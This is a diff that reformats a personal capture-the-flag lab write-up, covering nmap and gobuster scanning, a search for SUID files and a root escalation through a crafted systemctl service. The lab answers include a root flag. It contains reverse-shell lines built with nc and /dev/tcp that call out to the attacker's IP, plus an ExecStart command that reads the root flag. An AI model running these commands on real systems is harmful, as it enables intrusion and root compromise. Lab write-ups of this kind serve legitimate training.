@@ -8,17 +8,18 @@ Fire up the box and wait a bit for pings to return
 Create working folder and nmap folder
 
 Setup IP variable for simplicity
-Export IP=<ip address>
-10.10.101.248
+```bash
+export IP=10.10.82.241
+```
 
 # TASK 2
 
 Q. Scan the box; 
-#Nmap scan
-#nmap -sC -sV -oN nmap/initial $IP
-
-Results
-
+Nmap scan
+```bash
+nmap -sC -sV -oN nmap/initial $IP
+```
+'''
 Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-18 20:43 EDT                                    
 Nmap scan report for 10.10.82.241                                                                  
 Host is up (0.15s latency).                                                                        
@@ -52,10 +53,11 @@ Host script results:
 
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 30.62 seconds
+'''
 
 Q. How many ports are open?
 
-A> 6
+A. 6
 
 Q. What version of the squid proxy is running on the machine?
 
@@ -75,15 +77,17 @@ A. 3333
 
 Q. What is the flag for enabling verbose mode using Nmap?
 
-A. -v
+A. "-v"
 
 # TASK 3
 
 Q. What is the directory that has an upload form page?
 
-A. /internal/
+A. internal
 
-gobuster dir -w /usr/share/wordlist/dirbuster/directory-1.3.1-small.txt -u http://10.10.10.10:3333
+```bash
+gobuster dir -w /usr/share/wordlist/dirbuster/directory-1.3.1-small.txt -u http://10.10.82.241:3333
+```
 
 # TASK 4
 
@@ -109,7 +113,10 @@ Q. On the system, search for all SUID files. Which file stands out?
 
 A. go to https://gtfobins.github.io/ to find answer = /bin/systemctl
 
+```bash
 find / -type f -perm -04000 -ls 2>/dev/null
+```
+```
    396628     44 -rwsr-xr-x   1 root     root        41552 Feb  6  2024 /usr/bin/newuidmap
    395578     84 -rwsr-xr-x   1 root     root        85064 Feb  6  2024 /usr/bin/chfn
    396626     48 -rwsr-xr-x   1 root     root        45648 Feb  6  2024 /usr/bin/newgidmap
@@ -144,6 +151,7 @@ find / -type f -perm -04000 -ls 2>/dev/null
      1317     51 -rwsr-xr--   1 root     systemd-network    51344 Oct 25  2022 /snap/core20/2582/usr/lib/dbus-1.0/dbus-daemon-launch-helper
      1691    467 -rwsr-xr-x   1 root     root              477672 Apr 11 08:16 /snap/core20/2582/usr/lib/openssh/ssh-keysign
    393653     48 -rwsr-xr-x   1 root     root               48200 Apr  2 00:10 /sbin/mount.cifs
+```
 
 Q. What is the root flag value?
 
@@ -152,7 +160,7 @@ A. a58ff8579f0a9270368d33a9966c7fd5
 #Check Gtfobins for SUID escalation script - https://gtfobins.github.io/gtfobins/systemctl/
 
 Move to a writeable directory - I used /tmp
-
+```bash
 TF=$(mktemp).service
 
 echo '[Service]
@@ -168,24 +176,31 @@ WantedBy=multi-user.target' > $TF
 /bin/systemctl link $TF
 
 /bin/systemctl enable --now $TF
+```
 
-'We need to change the ExecStart command so I can create reverse shell as root. This is where my problems started...
+We need to change the ExecStart command so I can create reverse shell as root. This is where my problems started...
 
 Googling around I found 
 
+```bash
 ExecStart=/bin/sh -c "nc -e /bin/bash 10.2.57.121 9999"
+```
 
-'that didn't work. no -e option
+That didn't work. no -e option
 
+```bash
 ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/10.2.57.121/5555 0>&1'
+```
 
-'this didn't work either. "Bad fd number"
+This didn't work either. "Bad fd number"
 
-'More googling!
+More googling!
 
-'Finally I gave up on reverse shell and just decided to cat out the file and redirect it to a new file in temp I could read
+Finally I gave up on reverse shell and just decided to cat out the file and redirect it to a new file in temp I could read
 
+```bash
 ExecStart=/bin/sh -c "cat /root/root.txt > /tmp/root.txt"
+```
 
 That worked fine. 
 
